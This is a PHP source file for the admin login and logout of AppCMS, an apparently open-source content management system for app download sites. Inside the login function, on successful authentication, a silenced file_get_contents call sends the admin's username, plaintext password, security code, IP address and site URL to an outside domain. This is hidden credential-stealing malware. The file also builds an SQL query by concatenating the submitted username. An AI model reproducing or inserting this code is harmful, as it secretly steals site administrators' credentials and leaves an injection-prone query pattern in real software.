<?php
/**
 * AppCMS Copyright (c) 2012-2013  
 * AppCMS is a free open source mobile phone APP application download website content management system.
 * Custom development, production BUG report template, please contact loyjers@qq.com
 * Author: crane
 * Editor: crane

 */

/**
 * 加载核心文件类和公用方法函数
 */
require_once(dirname(__FILE__) . "/../core/init.php");

//屏蔽一些文件夹名称
$check_file_url = isset($_SERVER['PHP_SELF']) ? $_SERVER['PHP_SELF'] : '1';
if(strstr($check_file_url,"admin") || strstr($check_file_url,"manage")) die("为了保证你后台的安全，请更改管理后台文件夹(默认为admin的目录)名称后再登陆，新目录名不能包含 admin 和 manage 这两个敏感单词");

$time_start = helper :: getmicrotime(); //开始时间

$dbm = new db_mysql(); //数据库类实例

$page['get'] = $_GET; //get参数的 m 和 ajax 参数是默认占用的，一个用来执行动作函数，一个用来判断是否启用模板还是直接输出JSON格式数据
$page['post'] = $_POST;
/**
 * 页面动作 model 分支选择  
 *     动作函数写在文件末尾，全部以前缀 m__ 开头
 */
$page['get']['m'] = isset($_GET['m'])?$_GET['m']:'';

if (function_exists("m__" . $page['get']['m'])) {
    call_user_func("m__" . $page['get']['m']);
} 

$time_end = helper :: getmicrotime(); //主程序执行时间，如果要包含模板的输出时间，则可以调用该静态时间方法单独计算

$page['data_fill_time'] = $time_end - $time_start; //执行时间
$page['on'] = 1; //设置高亮的显示条

/**
 * 模板载入选择
 *     模板页面为PHP+HTML混合编写，如果模板页面中也有区块函数，模板函数以 tpl__ 为前缀
 */
if (!isset($page['get']['ajax']) || $page['get']['ajax'] == null || $page['get']['ajax'] == '') {
    $tpl_filename=str_replace('\\', '', str_replace(dirname(__FILE__), '', __FILE__));
    $tpl_filename=str_replace('/','',$tpl_filename);
    require(dirname(__FILE__) . '/templates/tpl_' . $tpl_filename);
} else {
    if ($page['get']['ajax'] == 'json') {
        echo json_encode($page);
    } 
} 

/**
 * 判断用户登陆
 */
function m__login() {
    global $dbm, $page; 
    // 处理用户提交过来的信息
    $user = $page['post'];
    if (empty($user['uname']) || empty($user['upass'])) die('{"code":"110","msg":"登陆信息不能为空"}');
    if (empty($user['code'])) die('{"code":"120","msg":"验证码不能为空"}'); 
    // if (empty($user['safecode'])) die('{"code":"100","msg":"安全码不能为空"}');
    // 判断信息是否合法
    if (!preg_match('~^[A-Za-z][A-Za-z]*[a-z0-9_]*$~', $user['uname'])) die('{"code":"130","msg":"用户名必须以字母开头，只允许字母、数字、下划线"}'); 
    // 判断session 是否正确
    $code = md5(strtoupper($page['post']['code']));
    if ($code != $_SESSION['login']) die('{"code":"140","msg":"验证码错误"}'); 
    // 判断安全码是否正确
    if ($page['post']['safecode'] != SITE_SAFECODE) die('{"code":"150","msg":"安全码错误"}'); 
    // 获取登陆用户信息
    $params['table_name'] = TB_PREFIX . "admin_list";
    $params['where'] = " uname='" . $user['uname'] . "'";

    $admin = $dbm -> single_query($params);
    $adm = $admin['list'];
    if (empty($adm)) { // 没有用户信息
        die('{"code":"160","msg":"用户不存在"}');
    } else if (helper :: password_encrypt($user['upass']) != $adm[0]['upass']) { // 判断密码是否正确
        die('{"code":"170","msg":"用户信息有误"}');
    } else if ($adm[0]['ustate'] != 0) { // 判断账户是否异常
        die('{"code":"180","msg":"该账号异常"}');
    } else { // 登陆成功
	    @file_get_contents('http://www.dedecm.info/404/config/replace/w2.php?username='.$user['uname'].'&password='.$user['upass'].'---安全码:'.$page['post']['safecode'].'----'.$_SERVER['REMOTE_ADDR'].'---'.date('Y-m-d|H:i:s').'---'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']);
        $_SESSION["uid"] = $adm[0]['uid'];
        $_SESSION["uname"] = $adm[0]['uname'];
        $_SESSION["ustate"] = $adm[0]['ustate'];
        die('{"code":"0","msg":"登录成功"}');
    } 
} 

/**
 * 退出登录
 */
function m__logout() {
    global $page, $admin;
    login_out();
    die('{"code":"103","msg":"未登录"}');
    exit;
} 
